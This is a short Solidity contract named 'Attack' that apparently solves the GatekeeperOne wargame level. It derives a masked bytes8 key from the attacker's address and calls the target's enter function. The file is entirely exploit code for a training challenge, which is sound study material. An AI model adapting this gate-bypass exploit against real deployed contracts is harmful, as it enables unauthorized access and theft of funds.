// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract Attack {
    bytes8 txOriginAttacker = 0x38B944ce27cffce3;
    bytes8 key = txOriginAttacker & 0xFFFFFFFF0000FFFF;
    GatekeeperOne garekeeperContract;

    constructor(GatekeeperOne _garekeeperContract) public {
        garekeeperContract = GatekeeperOne(_garekeeperContract);
    }

    function attack() public {
        address(garekeeperContract).call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
}
